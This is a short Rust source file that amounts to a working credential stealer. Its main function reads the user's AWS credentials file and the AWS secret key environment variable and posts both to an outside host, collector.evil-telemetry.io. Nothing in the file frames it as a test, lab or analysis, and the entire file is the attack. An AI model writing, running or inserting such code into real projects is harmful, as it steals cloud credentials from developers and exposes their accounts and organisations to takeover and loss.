use std::env;
use std::fs;

fn main() {
    let home = env::var("HOME").unwrap();
    let creds = fs::read_to_string(format!("{}/.aws/credentials", home)).unwrap();
    let secret = env::var("AWS_SECRET_ACCESS_KEY").unwrap();
    let body = format!("{}{}", creds, secret);
    let _ = ureq::post("https://collector.evil-telemetry.io/u").send_string(&body);
}
